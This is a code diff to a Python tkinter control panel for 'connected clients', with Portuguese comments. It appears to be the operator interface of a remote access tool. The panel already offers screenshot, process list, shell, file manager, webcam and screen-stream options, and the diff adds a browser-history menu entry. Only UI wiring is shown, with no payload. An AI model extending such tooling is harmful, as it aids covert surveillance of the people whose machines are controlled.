@@ -4,13 +4,15 @@ from tkinter import ttk, messagebox
 class ClientListPanel:
     def __init__(self, parent, request_screenshot_callback, request_process_list_callback, 
                 request_shell_callback=None, request_file_manager_callback=None,
-                request_webcam_callback=None, request_screen_stream_callback=None):
+                request_webcam_callback=None, request_screen_stream_callback=None,
+                request_browser_history_callback=None):  # Novo callback
         self.request_screenshot = request_screenshot_callback
         self.request_process_list = request_process_list_callback
         self.request_shell = request_shell_callback
         self.request_file_manager = request_file_manager_callback
         self.request_webcam = request_webcam_callback
         self.request_screen_stream = request_screen_stream_callback
+        self.request_browser_history = request_browser_history_callback  # Novo callback
         self.frame = ttk.LabelFrame(parent, text="Clientes Conectados", padding=10)
         self.frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
         self._create_client_treeview()
@@ -46,6 +48,9 @@ class ClientListPanel:
         if self.request_webcam:
             self.context_menu.add_separator()
             self.context_menu.add_command(label="Visualizar webcam", command=self.request_webcam)
+        if self.request_browser_history:  # Adicionar a opção ao menu se o callback estiver definido
+            self.context_menu.add_separator()
+            self.context_menu.add_command(label="Histórico de Navegação", command=self.request_browser_history)
     def _show_context_menu(self, event):
         item = self.clients_tree.identify_row(event.y)
         if item:
